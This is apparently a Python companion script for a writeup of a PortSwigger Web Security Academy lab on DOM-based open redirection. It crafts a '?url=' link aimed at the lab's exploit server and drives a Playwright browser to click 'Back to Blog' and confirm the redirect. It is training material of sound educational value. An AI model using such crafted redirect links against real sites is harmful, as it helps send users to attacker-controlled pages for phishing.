#!/usr/bin/env python3
"""
DOM-based open redirection
PortSwigger Web Security Academy -- DOM-Based Vulnerabilities

Companion script for the writeup: 04-dom-based-open-redirection.md

What this does -- and why it needs a real browser:
    The blog's "Back to Blog" link isn't a plain `href`; an `onclick` handler
    extracts a `url` query parameter from `location` via regex and assigns it
    to `location` on click. That handler only runs on an actual click event --
    a plain `httpx` GET loads the page and its JavaScript but never dispatches
    a click, so the redirect logic simply never fires. This script builds the
    crafted `?url=` link (same as our `craft_open_redirect_url()`), then drives
    a real browser with Playwright to load it and click the link, and confirms
    the redirect landed on the exploit server before polling the lab's home
    page for the solved banner.

Usage:
    python 04-dom-based-open-redirection.py <lab-url>
    e.g. python 04-dom-based-open-redirection.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import re
import sys
import httpx


def get_exploit_server_url(client, lab_url):
    r = client.get(lab_url)
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else None


def find_blog_post(client, lab_url):
    r = client.get(lab_url)
    m = re.search(r'href="(/post\?postId=\d+)"', r.text)
    return m.group(1) if m else None


def craft_open_redirect_url(target_url, redirect_to, param_name="url"):
    sep = "&" if "?" in target_url else "?"
    return f"{target_url}{sep}{param_name}={redirect_to}"


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    exploit_url = get_exploit_server_url(client, lab_url)
    if not exploit_url:
        print("[-] Could not find this lab's exploit server URL on the home page.")
        return
    print(f"[*] Exploit server: {exploit_url}")

    post_path = find_blog_post(client, lab_url)
    if not post_path:
        print("[-] Could not find a blog post link on the home page.")
        return
    print(f"[*] Found blog post: {post_path}")

    redirect_url = craft_open_redirect_url(f"{lab_url}{post_path}", exploit_url)
    print(f"[*] Crafted URL: {redirect_url}")

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("[!] Playwright not installed -- the redirect only fires on a real click")
        print("    event, so a plain HTTP GET here would not prove anything. Install it with:")
        print("    pip install playwright && playwright install chromium")
        print(f"    Or open {redirect_url} yourself and click 'Back to Blog'.")
        return

    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        page.goto(redirect_url)
        page.get_by_text("Back to Blog").click()
        page.wait_for_load_state("networkidle")

        if page.url.startswith(exploit_url):
            print(f"[+] Click redirected the browser to {page.url} -- exploit server reached.")
        else:
            print(f"[-] Browser ended up at {page.url}, not the exploit server.")

        check = page.goto(lab_url)
        html = check.text() if check else ""
        if "Congratulations" in html:
            print("[+] Lab solved.")
        else:
            print("[-] Home page does not show the solved banner yet.")
        browser.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
